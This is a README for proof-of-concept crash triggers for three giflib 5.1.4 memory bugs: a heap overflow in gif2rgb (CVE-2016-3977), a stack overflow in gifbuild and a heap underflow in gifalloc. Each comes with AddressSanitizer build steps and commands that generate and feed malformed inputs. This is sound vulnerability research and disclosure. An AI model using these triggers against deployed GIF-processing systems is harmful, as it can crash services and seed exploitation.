# Proof-of-Concept: giflib 5.1.4 Vulnerabilities

Three vulnerabilities discovered by Mantis in giflib 5.1.4, each with a standalone PoC generator and pre-built trigger file.

## Prerequisites

Build giflib 5.1.4 with AddressSanitizer:

```bash
mantis build --config harness-giflib.yaml
# Or manually:
cd runs/giflib514-src
export CC=clang CFLAGS="-fsanitize=address -g -O1 -fno-omit-frame-pointer"
export LDFLAGS="-fsanitize=address"
./configure --disable-shared && make
```

## Finding 1: heap-buffer-overflow in gif2rgb (CVE-2016-3977)

**File**: `util/gif2rgb.c:293` — `DumpScreen2RGB`
**Type**: READ, 765 bytes past a 6-byte allocation

A 40-byte GIF with a 2-entry colormap and LZW pixel value 255:

```bash
python3 gen_gif2rgb_oob_read.py > poc_gif2rgb_oob.gif
gif2rgb poc_gif2rgb_oob.gif
```

Pre-built: `poc_gif2rgb_oob.gif` (40 bytes)

## Finding 2: stack-buffer-overflow in gifbuild

**File**: `util/gifbuild.c:242` — `Icon2Gif`
**Type**: WRITE, 1 byte past `char[93]` stack array

A gifbuild text input with 94 colormap entries (array holds 93):

```bash
python3 gen_gifbuild_stack_overflow.py > poc_gifbuild_overflow.txt
gifbuild < poc_gifbuild_overflow.txt > /dev/null
```

Pre-built: `poc_gifbuild_overflow.txt` (1.9 KB)

## Finding 3: heap-buffer-underflow in gifalloc

**File**: `lib/gifalloc.c:148` — `GifUnionColorMap`
**Type**: READ, 3 bytes before a 6-byte allocation

An all-black GIF triggers `CrntSlot` to decrement past 0:

```bash
python3 gen_gifalloc_underflow.py
gifbuild < poc_gifalloc_trigger.txt > /dev/null
```

Pre-built: `poc_allblack.gif` (35 bytes) + `poc_gifalloc_trigger.txt` (244 bytes)
